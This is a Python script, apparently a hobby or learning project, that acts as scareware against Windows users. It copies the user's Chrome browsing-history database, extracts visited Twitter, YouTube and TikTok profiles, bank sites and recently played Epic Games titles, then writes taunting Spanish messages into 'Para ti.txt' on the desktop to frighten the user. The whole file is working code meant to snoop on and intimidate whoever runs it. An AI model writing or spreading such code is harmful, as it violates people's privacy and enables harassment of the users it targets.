import os
from shutil import copyfile
from time import sleep 
from random import randrange
import sqlite3
from pathlib import Path
import re
import datetime 

hacker_file_name='Para ti.txt'


def check_disk():
    current_directory=os.getcwd()
    drive_letter,_=os.path.splitdrive(current_directory)
    drive_letter_final=drive_letter
    return drive_letter_final


def check_user():
    return '{}\\'.format (Path.home()) #we use this in order to get all the part of the disk and the user_name :)
# user_path2= check_user()
# final_path=user_path2+"\\Documents\\"+hacker_file_name
# print(final_path)


def check_onedrive():
    path_directory=check_user()
    Onedrive_folde='OneDrive'
    #we can use the os and path in order to get an analyisis of my folders and check if I have the folder that I want to checking
    path_check=os.path.join(path_directory,Onedrive_folde)
    if os.path.isdir(path_check):
        return path_check
    else:
        return None


def delay_action():
    n_hours=randrange(1,4)
    print('El programa se abrira en {} horas'.format(n_hours))
    sleep(n_hours)
        #   *60*60)


def create_hacker_file(user_path):
    #The + operator concatenates the strings together, joining them in the desired order with the specified separator 
    #('\\' in this case) to form the complete file path string.
    path_temp=user_path+'\\Escritorio\\'
    # print(path_temp)
    hacker_file= open(path_temp+hacker_file_name,'w') 
    return hacker_file



def get_chrome_history(user_path):
     #this code makes me to get access to the history of the chrome#####
    urls=None
    while not urls:
        try:
            history_path= user_path+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
            history_path_temp=history_path+'temp'
            copyfile(history_path, history_path_temp)
            connection=sqlite3.connect(history_path_temp)
            cursor=connection.cursor()
            cursor.execute('SELECT title, last_visit_time, url from urls ORDER BY last_visit_time DESC')
            urls=cursor.fetchall()
            connection.close()
           # print(urls)
            return urls
        except sqlite3.OperationalError:
            print('No se puede acceder al history, reintentando en tres segundos....')
            sleep(3)


def check_history_and_scarehistory_twitter(hacker_file2,chrome_history,boolean_t):
    profiles=[]
    for item in chrome_history:
        result=re.findall('https://twitter.com/([A-Za-z0-9]+)$', item[2])
        if result and result[0] not in ['notifications','home','login']:
            profiles.append(result[0])
    if profiles:
            print('\n')
            hacker_file2.write('\n\nHe visto que haz revisado los siguientes perfiles: {} interesante..... '.format(",".join(profiles)))
            boolean_t=False
            return boolean_t
    elif not profiles and boolean_t==True:
        boolean_t=True
        return boolean_t



def check_history_and_scarehistory_youtube(hacker_file2,chrome_history,boolean_t):
    profiles_youtube=[]
    for item in chrome_history:
        result_youtube=re.findall('https://www.youtube.com/@([A-Za-z0-9]+)',item[2])
        if result_youtube:
            profiles_youtube.append(result_youtube[0])
    if profiles_youtube:
        boolean_t=False
        print('\n')       
        hacker_file2.write('\n\nHe visto que haz revisado los siguientes canales de youtube: {} interesante...'.format(','.join(profiles_youtube)))
        return boolean_t
    elif not profiles_youtube and boolean_t==True:
        boolean_t=True
        return boolean_t



def check_history_and_scarehistory_tiktok(hacker_file2,chrome_history,boolean_t):
    profiles_tik_tok=[]
    for item in chrome_history:
        result_tiktok=re.findall('https://www.tiktok.com/@([A-Za-z0-9_-]+)',item[2])
        if result_tiktok:
            profiles_tik_tok.append(result_tiktok[0])
    if profiles_tik_tok:
        boolean_t=False 
        print('\n')
        hacker_file2.write('\n\nHe visto que haz revisado los siguientes canales de Tik tok: {} interesante...'.format(','.join(profiles_tik_tok)))
        return boolean_t
    elif not profiles_tik_tok and boolean_t==True:
        boolean_t=True
        return boolean_t
    
def check_games(hacker_file2,boolean_t):
    epic_games_path='C:\\Program Files\\Epic Games'
    games_folder=os.listdir(epic_games_path)
    # print(games_folder)
    game_last_played=[]
    for games in games_folder:
        game_folder=os.path.join(epic_games_path,games)
        last_modified=os.path.getatime(game_folder)
        last_modified_date=datetime.datetime.fromtimestamp(last_modified)
        last_modified_date_format=last_modified_date.strftime('%Y-%m-%d %H:%M:%S')
        game_last_played.append((games,last_modified_date_format))        
    # print(game_last_played)
    sorted_folder= sorted(game_last_played, key=lambda x: x[1], reverse=True)
    if sorted_folder:
        boolean_t=False 
        print('\n')
        hacker_file2.write('\n\nHe visto que haz jugado estos juegos ultimamente \njajajaja....:\n')
        for folder, last_modified_date in sorted_folder:
            # print('Folder: {} \t last Modified {} '.format(folder, last_modified_date))
            hacker_file2.write('\n\nFolder: {}--->\t  Last time Modified {}\n'.format(folder, last_modified_date))
        return boolean_t        
    elif not sorted_folder and boolean_t==True:
        boolean_t=True
        return boolean_t

def check_history_banks(hacker_file2,chrome_history,boolean_t):
    b_save=None
    for item in chrome_history:
        for banks_items in list_banks:
            if banks_items.lower() in item[0].lower():
                b_save=banks_items
                break
        if b_save:
            break
    if b_save:
        boolean_t=False
        hacker_file2.write('\n\nHe visto que haz entrado ultimamente a la pagina del banco {} interesante...'.format((b_save)))
        return boolean_t
    elif not b_save and boolean_t==True:
        boolean_t=True
        return boolean_t

list_banks = ["JPMorgan Chase",
    "Bank of America",
    "Citigroup",
    "Wells Fargo",
    "Goldman Sachs",
    "Morgan Stanley",
    "U.S. Bancorp",
    "PNC Financial Services",
    "Truist Financial",
    "Charles Schwab Corporation"
]


def main():
    delay_action()
    h=check_disk()
    #we take the route of the user of window
    user_path= check_user()
    # print(user_path)
    user_path_drive=check_onedrive()
    if user_path_drive:
        user_path2=user_path_drive
    else:
        user_path2=user_path
        pass
    #we take the archive of of desktop
    boolean_t=True
    while boolean_t==True:
        hacker_file2=create_hacker_file(user_path2)
    #we take the history of google 
        chrome_history=get_chrome_history(user_path)
    ##Escribiendo mensajes de miedo para twitter
        boolean_t=check_history_and_scarehistory_twitter(hacker_file2,chrome_history,boolean_t)
    ##Escribiendo mensajes de miedo para youtube
        boolean_t=check_history_and_scarehistory_youtube(hacker_file2,chrome_history,boolean_t)
    ##Escribiendo mensajes de miedo para tiktok
        boolean_t=check_history_and_scarehistory_tiktok(hacker_file2,chrome_history,boolean_t)
        boolean_t=check_history_banks(hacker_file2,chrome_history,boolean_t)
        chrome_history=get_chrome_history(user_path)
    #checking games
        boolean_t=check_games(hacker_file2,boolean_t)
    
    # shutil.move(path_temp+hacker_file_name,final_path)

    
if __name__=="__main__":
    main()

